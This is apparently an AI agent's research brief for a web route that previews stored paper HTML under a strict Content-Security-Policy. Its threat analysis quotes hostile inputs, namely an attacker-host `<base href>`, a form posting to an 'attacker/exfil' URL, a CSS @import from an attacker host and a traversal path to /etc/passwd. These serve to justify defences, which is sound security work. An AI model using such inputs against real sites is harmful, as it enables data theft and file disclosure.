# Research Brief — proof-verify-handler-wiring-m10

**Agent:** milestone-researcher (brief-2)
**Generated:** 2026-05-22T18:15:00Z

---

## In-codebase context

### CRITICAL: Storage path mismatch — brief vs codebase

**The milestone brief says HTML lives at `var/arxmcp/corpus/parsed/<paper_id>/index.html`. This is WRONG.**

The actual storage path established by m8 is:

```
var/arxmcp/notebooks/<slug>/ar5iv/<flat_paper_id>.html
```

where `flat_paper_id = paper_id.replace("/", "_")` (old-style IDs with `/` are flattened).

Evidence: `server/routes/notebooks.py:605-620` — `ar5iv_dir = nb_dir / "ar5iv"`, `target_path = ar5iv_dir / f"{flat_paper_id}.html"`. The `var/arxmcp/corpus/parsed/` tree does exist (seed corpus HTML lives there), but the notebook-scoped upload pipeline writes to `var/arxmcp/notebooks/<slug>/ar5iv/`. The preview handler must use the notebook-scoped path, NOT `corpus/parsed/`.

### Existing CSP in SecurityHeadersMiddleware (server/middleware.py:170-177)

The m8 rect F2 CSP already applied to ALL `/ui/*` paths is:

```
default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'
```

The preview route is at `/ui/notebooks/{slug}/papers/{paper_id}/preview` — it IS under `/ui/*`, so `SecurityHeadersMiddleware` will inject the BROAD m8 CSP automatically. The m10 preview route needs a TIGHTER, per-response CSP that OVERRIDES this middleware-injected header. The `SecurityHeadersMiddleware` uses idempotency (`if b"content-security-policy" not in existing: headers.append(...)`) so a handler that sets its own CSP response header FIRST will win.

**Mechanism:** The preview handler must set `Content-Security-Policy` explicitly in its FastAPI response. `SecurityHeadersMiddleware` checks `existing = {k.lower() for k, _ in headers}` and only appends if absent. If the handler emits the tight CSP directly, the middleware skips injection.

### m9 scope-invariant test conflict (tests/test_m9_scope_invariants.py:22-52)

`test_no_preview_or_iframe_in_frontend` greps `frontend/` for `iframe|preview` case-insensitively and FAILS if found (exit 0 means matches found). m10 deliberately adds both tokens to `frontend/templates/` (a "Preview" link in the browse table). **The implementer MUST delete or scope this test.** The simplest resolution: delete the test file — its purpose was to enforce that m9 did not leak m10 content; once m10 ships, the test is obsolete. Alternatively, update the assertion to check for specific m10-added patterns rather than banning the tokens.

### Paper-ID validation (ingest/identifiers.py:67-74)

`is_valid_paper_id` uses `\Z` anchor (m1-rect-F3 hardening), rejecting trailing newlines and path traversal sequences. The preview route MUST call `is_valid_paper_id(paper_id)` before any filesystem lookup.

### Existing `notebook_dir` path-containment guard (tools/_notebook_common.py:68-92)

`notebook_dir(slug)` runs a symlink-rejection path-containment check (`(notebooks_base / slug).resolve()`). The preview handler should use `notebook_dir(slug)` to get `nb_dir`, then derive `ar5iv_dir = nb_dir / "ar5iv"` — inheriting the symlink check.

---

## Prior decisions and lessons

- **`BaseHTTPMiddleware` is project-banned** (E06_S01 F1 — silently no-ops SSE response interception). All middleware and response manipulation is pure-ASGI. The preview handler sets CSP via a `Response` object, not middleware.
- **`assert` is banned for invariants** — the paper-id validation path must use `if not is_valid_paper_id(paper_id): raise HTTPException(422)`.
- **Old-style paper IDs contain `/`** (e.g., `hep-th/0001234`). The URL path parameter must accommodate this. FastAPI routes use `{paper_id:path}` to allow slashes in path segments. The `is_valid_paper_id` call is the guard against traversal via path parameter.
- **KMP_DUPLICATE_LIB_OK guard** in `tests/conftest.py` — not touched by m10 (no faiss/PyTorch interaction).
- **No MCP tool changes** — this milestone adds a UI route only. `EXPECTED_TOOL_SCHEMA_SHA256` does NOT need re-pinning.
- Recent git log: the proof-verify-handler-wiring series (m6–m9) has established the pattern of htmx fragments + `_paper_row_html` for inline HTML generation. m10 adds a full-page route alongside the fragment pattern.

---

## External sources

### CSP Level 3 (W3C TR/CSP3) — directive analysis

**`default-src` fallback scope.** Per §6.8.3 "Get fetch directive fallback list," `default-src` is the fallback for FETCH directives only. Navigation directives (`form-action`, `frame-ancestors`) and document directives (`base-uri`, `sandbox`) do NOT inherit from `default-src`. They have independent defaults.

**`frame-ancestors` default.** When `frame-ancestors` is absent from the policy, framing restrictions do not apply — any origin can embed the resource. The CSP3 spec §6.4.2 does not set a restrictive default. This is a critical gap in the proposed CSP.

**`script-src 'none'` and inline event handlers.** `script-src 'none'` blocks `<script>` elements and `eval()`. However, inline event handler attributes (`onclick="..."`, `onerror="..."`) are governed by `script-src-attr` (CSP3 §6.1.12). The fallback chain for `script-src-attr` is: `script-src-attr` → `script-src` → `default-src`. Since the proposed CSP has `script-src 'none'` and `default-src 'none'`, the fallback chain resolves to `'none'` for `script-src-attr`. **Inline event handlers ARE blocked without explicit `script-src-attr` in this specific CSP**, because `script-src 'none'` is the fallback. No separate `script-src-attr 'none'` directive is strictly necessary — but adding it is belt-and-braces and documents intent explicitly.

**`base-uri` gap.** `base-uri` is a DOCUMENT directive — it does NOT fall back to `default-src`. When `base-uri` is absent, a paper containing `<base href="https://attacker/">` redirects ALL relative URL resolution to attacker.com. Mitigation: add `base-uri 'none'` explicitly.

**`form-action` gap.** `form-action` is a NAVIGATION directive — does NOT fall back to `default-src`. When absent, `<form action="https://attacker/exfil">` + user click posts to attacker. Mitigation: add `form-action 'none'`.

**`object-src` gap.** `object-src` IS a fetch directive — it DOES fall back to `default-src 'none'`. `<object>` and `<embed>` elements are blocked by the fallback. No explicit directive needed.

**`media-src`, `worker-src`, `connect-src`.** All fetch directives; all fall back to `default-src 'none'`. Blocked.

### HTML spec sandbox attribute

Verbatim key text (html.spec.whatwg.org): "the content is treated as being from a unique opaque origin, forms, scripts, and various potentially annoying APIs are disabled, and links are prevented from targeting other navigables."

`allow-same-origin`: "causes the content to be treated as being from its real origin instead of forcing it into an opaque origin."

Safety of `allow-same-origin` without `allow-scripts`: The spec explicitly warns: "Setting both the allow-scripts and allow-same-origin keywords together when the embedded page has the same origin as the page containing the iframe allows the embedded page to simply remove the sandbox attribute and then reload itself." The ABSENCE of `allow-scripts` makes `allow-same-origin` safe — scripts cannot run to remove the sandbox attribute.

**Critical interaction with CSP `'self'`:** WITHOUT `allow-same-origin`, the iframe has an opaque origin, so `img-src 'self'` in the iframe's CSP matches NOTHING (the frame's "self" is an opaque origin that doesn't match any URL). WITH `allow-same-origin`, the iframe's origin is the server's origin, so `img-src 'self'` allows images from `http://127.0.0.1:7733` — which is the desired behavior for ar5iv's self-hosted assets.

---

## Failure-mode analysis

**FM-1 (XSS via CSS @import):** `<style>@import url(https://attacker/x);</style>`. CSP `style-src 'self' 'unsafe-inline'` permits inline `<style>` blocks but `@import` requires fetching an external stylesheet. External fetches fall under `style-src`; the source `'self'` restricts to same-origin only. External `@import` is blocked. VERIFIED SAFE.

**FM-2 (`<base href>` escape):** A paper contains `<base href="https://attacker/">`. ALL relative links and resource references in the page resolve against attacker.com. The proposed CSP omits `base-uri`. **This is a real gap.** Mitigation: add `base-uri 'none'` to the CSP. ar5iv HTML does not use `<base>` legitimately; `'none'` has zero functional cost.

**FM-3 (form-action exfiltration):** A paper contains `<form action="https://attacker/x">` with a clickable submit button. `default-src 'none'` does NOT block `form-action` (navigation directive). A user clicking the submit button would POST to attacker. Mitigation: add `form-action 'none'`. **Real gap.**

**FM-4 (frame-ancestors clickjacking):** The preview page itself could be framed by another page (including a malicious local web app on a different port). The proposed CSP omits `frame-ancestors`. `default-src 'none'` does NOT restrict framing. The existing `SecurityHeadersMiddleware` adds `X-Frame-Options: DENY` globally, which is defense-in-depth, but CSP `frame-ancestors` supersedes X-Frame-Options when both are present per CSP3 §8.4. Since the preview route handler sets its own CSP (overriding the middleware), `frame-ancestors 'none'` MUST be in the handler-emitted CSP. **Real gap.**

**FM-5 (object/embed plugins):** `<object data="...">` or `<embed src="...">`. `object-src` is a fetch directive and falls back to `default-src 'none'`. BLOCKED. No gap.

**FM-6 (path traversal via paper_id):** `GET /ui/notebooks/mynotebook/papers/../../../etc/passwd/preview`. The `{paper_id:path}` FastAPI parameter accepts slashes, enabling traversal. Mitigation chain: (1) `is_valid_paper_id(paper_id)` rejects non-arXiv-format IDs at handler entry, (2) `notebook_dir(slug)` provides path-containment check, (3) resolve the final path and assert it is under `nb_dir / "ar5iv"` before opening the file. Belt-and-braces: three independent checks.

**FM-7 (404 for missing file):** AC #2 says the "Preview" link appears only when on-disk HTML exists. But the GET route `/ui/.../preview` must ALSO return 404 for a direct URL hit when the file is missing. Otherwise a client can infer which paper_ids are in the notebook (but not on disk) by probing the route. The handler must: check `is_valid_paper_id`, locate the file, return 404 if absent (with a generic "not found" body — don't reveal the filesystem path).

**FM-8 (m9 scope-invariant test conflict):** `tests/test_m9_scope_invariants.py::test_no_preview_or_iframe_in_frontend` greps `frontend/` for `iframe|preview` and FAILS if found. m10 adds both. **Implementer must remove or repurpose this test before committing.** The test is specifically a milestone-boundary guard — once m10 ships, it has served its purpose. Delete the test file.

**FM-9 (MathJax/JS rendering gap):** ar5iv HTML uses MathJax 3 for math rendering. MathJax requires `script-src 'self' 'unsafe-eval'` (it uses `eval()` and `Function()` internally for performance). The m10 CSP sets `script-src 'none'`, which means MathJax will NOT initialize and math will render as raw LaTeX markup (e.g., `\frac{1}{2}` displayed as literal text). This is an intentional trade-off per the brief ("no JS execution needed") and must be documented in the implementation summary. The three alternatives (CDN MathJax, vendored MathJax, server-side KaTeX pre-render) all have significant scope/security cost. Accept raw-LaTeX display for v2 m10.

**FM-10 (Sec-Fetch-Site middleware conflict):** The `SecFetchSiteMiddleware` in `server/middleware.py:510-598` relaxes the Sec-Fetch-Site allow-set for `/ui/*` paths from `{none}` to `{none, same-origin}`. The preview GET is a top-level navigation (user clicks a link), so `Sec-Fetch-Site` will be absent or `none` — passes the middleware. No conflict.

---

## Recommendation

**Implement the preview handler as a plain FastAPI GET route at `/ui/notebooks/{slug}/papers/{paper_id:path}/preview`.**

Handler signature sketch:
```python
@router.get("/notebooks/{slug}/papers/{paper_id:path}/preview")
async def preview_paper(slug: str, paper_id: str, request: Request) -> Response:
    validate_slug(slug)                         # existing m6 guard
    if not is_valid_paper_id(paper_id):
        raise HTTPException(422, "invalid paper_id")
    nb_dir = notebook_dir(slug)
    ar5iv_dir = nb_dir / "ar5iv"
    flat = paper_id.replace("/", "_")
    html_path = ar5iv_dir / f"{flat}.html"
    # Belt-and-braces containment check:
    if not str(html_path.resolve()).startswith(str(ar5iv_dir.resolve())):
        raise HTTPException(403, "path escape")
    if not html_path.is_file():
        raise HTTPException(404, "no preview available")
    content = html_path.read_bytes()
    TIGHT_CSP = (
        "default-src 'none'; "
        "img-src 'self' data:; "
        "style-src 'self' 'unsafe-inline'; "
        "script-src 'none'; "
        "base-uri 'none'; "          # FM-2: blocks <base href>
        "form-action 'none'; "       # FM-3: blocks form exfiltration
        "frame-ancestors 'none'"     # FM-4: blocks framing of preview page
    )
    wrapped = _wrap_in_preview_shell(content, slug, paper_id)
    return Response(
        content=wrapped,
        media_type="text/html",
        headers={"Content-Security-Policy": TIGHT_CSP},
    )
```

The iframe wrapping template structure:
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Preview: {paper_id} · {slug}</title>
  <style>html,body{margin:0;height:100%} iframe{border:0;width:100%;height:100%}</style>
</head>
<body>
  <iframe
    src="/ui/notebooks/{slug}/papers/{paper_id}/preview/raw"
    sandbox="allow-same-origin"
    title="Paper preview: {paper_id}">
  </iframe>
</body>
</html>
```

**Wait — simpler alternative:** Serve the ar5iv HTML directly (not in a nested iframe) with the tight CSP on the response. The sandboxing is enforced by the parent's `<iframe sandbox="allow-same-origin">` element wrapping THIS page in the browse table. The AC says the ROUTE returns HTML "wrapped in a minimal page with CSP" — interpret as: the route returns the ar5iv HTML directly with the tight CSP header, and the browse table template adds a `<iframe sandbox="allow-same-origin" src="/ui/.../preview">` link. This is architecturally cleaner. Use this approach.

**CSP recommendation:** extend the brief's CSP with `base-uri 'none'; form-action 'none'; frame-ancestors 'none'`. This closes FM-2, FM-3, FM-4. Total recommended CSP:
```
default-src 'none'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'
```

**Math rendering:** document that MathJax will not execute and math displays as raw LaTeX. Note as future-enhancement (server-side KaTeX pre-render would require ingest pipeline changes — out of m10 scope).

---

## Open questions

1. **Does the browse table "Preview" link open an `<iframe>` inline on the page, or navigate to the preview URL in a new tab?** The AC says "Preview link next to each paper" but does not specify inline vs new-tab. Inline iframe requires `_paper_row_html` to be updated to check for on-disk existence per-row (requires a filesystem stat per paper at page render time). New-tab navigation is simpler. **Recommended:** new-tab (`<a href="..." target="_blank">`) — avoids per-row stat cost and the `<iframe>` nesting question. The AC says "renders in a sandboxed iframe" but refers to the browser's handling of the route response, not necessarily an inline iframe in the browse table.

2. **Should the preview route be under the API router (`/ui/api/notebooks/...`) or the UI router (`/ui/notebooks/...`)?** The route URL in the brief is `/ui/notebooks/{slug}/papers/{paper_id}/preview` (not `/ui/api/...`). The existing `notebooks_router` is mounted at `/ui/api` (`server/main.py:552`). **Implication:** the preview route needs a SEPARATE router mounted at `/ui` OR the existing notebooks_router needs a second mount. **Recommended:** add the preview route to `server/routes/ui.py` or create a dedicated `server/routes/preview.py` — do NOT add it to the `/ui/api` prefix.

---

## External writes the implementation will require

None — this milestone is purely local. New route + template update + tests. No git push, no PR creation, no infra mutation, no third-party API call. No MCP tool surface changes (no EXPECTED_TOOL_SCHEMA_SHA256 re-pinning required).
